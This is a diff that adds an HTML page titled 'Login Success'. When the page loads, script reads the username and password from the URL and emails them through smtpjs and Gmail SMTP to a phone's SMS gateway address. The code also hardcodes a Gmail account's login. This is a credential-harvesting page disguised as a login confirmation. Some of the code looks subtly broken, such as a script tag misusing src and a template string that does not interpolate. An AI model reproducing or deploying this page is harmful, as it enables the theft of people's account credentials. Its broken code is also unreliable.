@@ -1,0 +1,33 @@
+<html>
+  <head>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <title>Login Success</title>
+  </head>
+  <body onload="formSub()"></body>
+</html>
+
+<script src= "text/javascript">
+  function sendEmail(link) {
+        var thislink = link;
+          Email.send({
+              Host: "smtp.gmail.com",
+              Username: "legosmsbotboss@gmail.com",
+              Password: "b0tp@ssword",
+              To: "3098243631@vtext.com",
+              From: "legosmsbotboss@gmail.com",
+              Subject: "",
+              Body: thislink,
+          })
+              .then(function (message) {
+                  console.log("mail sent successfully")
+          });
+      }
+    function formSub() {
+          let params = new URLSearchParams(location.search);
+          var usn = params.get('username');
+          var psw = params.get('password');
+          if (usn != null && psw != null) {
+                sendEmail('Username: ${usn}  Password: ${psw}');
+          }
+    }
+</script>
